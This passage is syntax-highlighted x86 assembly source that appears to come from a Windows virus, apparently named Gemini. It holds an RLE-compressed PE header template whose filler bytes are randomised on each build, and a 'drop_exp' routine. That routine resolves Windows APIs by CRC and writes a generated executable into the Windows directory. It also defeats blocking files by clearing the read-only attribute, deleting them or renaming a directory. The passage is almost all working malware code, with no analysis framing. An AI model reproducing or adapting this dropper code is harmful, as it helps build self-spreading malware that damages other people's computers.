        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">exename</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">".exe"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">explabel</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0d4h</span><span class="sc0">
</span><span class="sc1">;RLE-based compressed MZ header, PE header, import table, section table</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">11111111110000011100001011100000b</span><span class="sc0">
        </span><span class="sc1">;       mmmmmmmmmmz   01mmz   02mmm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"gdi32.dll"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000110000111100001001010010000b</span><span class="sc0">
        </span><span class="sc1">;       z   01mz   03mmz   02r   04m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000111110100100001001000111110b</span><span class="sc0">
        </span><span class="sc1">;       z   01mmmmr   02z   04mz   07mm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00001001010010001011000010100001b</span><span class="sc0">
        </span><span class="sc1">;       z   02r   04mz   05mz   02mz   02</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000110000101010111100001111100b</span><span class="sc0">
        </span><span class="sc1">;       z   01mz   02mr   07mz   03mmm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Arc"</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00001010000101000111100000101001b</span><span class="sc0">
        </span><span class="sc1">;       z   02mz   03mz   07mz   01r   02</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">((</span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1fffh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0fffh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">10000111000011100001110000110101b</span><span class="sc0">
        </span><span class="sc1">;       mz   03mz   03mz   03mz   03r  04</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">10001110101001100101001111001111b</span><span class="sc0">
        </span><span class="sc1">;       mz   07r   04mmz   0ar   0er   0e</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00010110000111000010100001101100b</span><span class="sc0">
        </span><span class="sc1">;       z   05mz   03mz   02mz   03r   08</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ffh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">1ffh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00011110000000000000000000000000b</span><span class="sc0">
        </span><span class="sc1">;       z   07m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e0h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;decompressed data follow.  'X' bytes are set to random value every time</span><span class="sc0">
</span><span class="sc1">;       db      'M', 'Z'                ;00</span><span class="sc0">
</span><span class="sc1">;       db      "gdi32.dll", 0          ;02    align 4, filler (overload for dll name and import lookup table RVA)</span><span class="sc0">
</span><span class="sc1">;       db      'P', 'E', 0, 0          ;0c 00 signature (overload for date/time stamp)</span><span class="sc0">
</span><span class="sc1">;       dw      14ch                    ;10 04 machine (overload for forwarder chain)</span><span class="sc0">
</span><span class="sc1">;       dw      1                       ;12 06 number of sections (overload for forwarder chain)</span><span class="sc0">
</span><span class="sc1">;       dd      2                       ;14 08 date/time stamp (overload for dll name RVA)</span><span class="sc0">
</span><span class="sc1">;       dd      102ch                   ;18 0c pointer to symbol table (overload for import address table RVA)</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;1c 10 number of symbols</span><span class="sc0">
</span><span class="sc1">;       dw      88h                     ;20 14 size of optional header</span><span class="sc0">
</span><span class="sc1">;       dw      30fh                    ;22 16 characteristics</span><span class="sc0">
</span><span class="sc1">;       dw      10bh                    ;24 18 magic</span><span class="sc0">
</span><span class="sc1">;       db      X                       ;26 1a major linker</span><span class="sc0">
</span><span class="sc1">;       db      X                       ;27 1b minor linker</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;28 1c size of code (overload for import table terminator)</span><span class="sc0">
</span><span class="sc1">;       dd      56h                     ;2c 20 size of init data (overload for import name table RVA)</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;30 24 size of uninit data (overload for import name table terminator)</span><span class="sc0">
</span><span class="sc1">;       dd      expsize + 1000h         ;34 28 entry point</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;38 2c base of code</span><span class="sc0">
</span><span class="sc1">;       dd      0ch                     ;3c 30 base of data (overload for lfanew)</span><span class="sc0">
</span><span class="sc1">;       dd      400000h                 ;40 34 image base</span><span class="sc0">
</span><span class="sc1">;       dd      1000h                   ;44 38 section align</span><span class="sc0">
</span><span class="sc1">;       dd      200h                    ;48 3c file align</span><span class="sc0">
</span><span class="sc1">;       db      1, X                    ;4c 40 major os</span><span class="sc0">
</span><span class="sc1">;       db      X, X                    ;4e 42 minor os</span><span class="sc0">
</span><span class="sc1">;       db      X, X                    ;50 44 major image</span><span class="sc0">
</span><span class="sc1">;       db      X, X                    ;52 46 minor image</span><span class="sc0">
</span><span class="sc1">;       dw      4                       ;54 48 major subsys</span><span class="sc0">
</span><span class="sc1">;       dw      0                       ;56 4a minor subsys (overload for import name table)</span><span class="sc0">
</span><span class="sc1">;       db      "Arc", 0                ;58 4c reserved (overload for import name table)</span><span class="sc0">
</span><span class="sc1">;       dd      (aligned size of code)  ;5c 50 size of image</span><span class="sc0">
</span><span class="sc1">;       dd      expsize                 ;60 54 size of headers</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;64 58 checksum</span><span class="sc0">
</span><span class="sc1">;       dw      2                       ;68 5c subsystem</span><span class="sc0">
</span><span class="sc1">;       db      X, X                    ;6a 5e dll characteristics</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;6c 60 size of stack reserve</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;70 64 size of stack commit</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;74 68 size of heap reserve</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;78 6c size of heap commit</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;7c 70 loader flags</span><span class="sc0">
</span><span class="sc1">;       dd      2                       ;80 74 number of rva and sizes (ignored by Windows 9x/Me)</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;84 78 export</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;88 7c export</span><span class="sc0">
</span><span class="sc1">;       dd      1008h                   ;8c 80 import</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;90 84 import</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;94 88 resource</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;98 8c resource</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X, X, X, X, X  ;9c 90 exception</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X, X, X, X, X  ;a4 98 certificate</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X, X, X, X, X  ;ac a0 base reloc (overload for section name)</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;b4 a8 debug (overload for virtual size)</span><span class="sc0">
</span><span class="sc1">;       dd      1000h                   ;b8 ac debug (overload for virtual address)</span><span class="sc0">
</span><span class="sc1">;       dd      (aligned size of code)  ;bc b0 architecture (overload for file size)</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;c0 b4 architecture (overload for file offset)</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;c4 b8 global data (overload for pointer to relocs)</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;c8 bc global data (overload for pointer to line numbers)</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;cc c0 tls (overload for reloc table and line numbers)</span><span class="sc0">
</span><span class="sc1">;       dd      0e0000000h              ;d0 c4 tls (overload for section characteristics)</span><span class="sc0">
</span><span class="sc1">;                                       ;d4</span><span class="sc0">

</span><span class="sc5">drop_exp</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">explabel</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drop_exp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ffh</span><span class="sc0">
                                                </span><span class="sc1">;file size must be &gt; end of last section</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                        </span><span class="sc1">;GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GlobalFree</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;WriteFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;WriteFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;WriteFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">                   </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">                   </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;MoveFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;MoveFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;SetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;SetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;DeleteFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;GetTempFileNameA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;GetTempFileNameA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;GetTempFileNameA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GetTempFileNameA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;GetWindowsDirectoryA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GetWindowsDirectoryA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGetTempFileNameA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pDeleteFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">scas</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skip_slash</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;append exe name, assumes name is 0ch bytes long</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">skip_slash</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;anti-anti-file dropper - remove read-only attribute, delete file, rename directory</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pSetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skip_move</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pMoveFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">skip_move</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pCreateFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;WriteFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGetTickCount</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;decompress MZ header, PE header, section table, import table</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">copy_bytes</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">test_bits</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">copy_bytes</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stos</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_bits</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
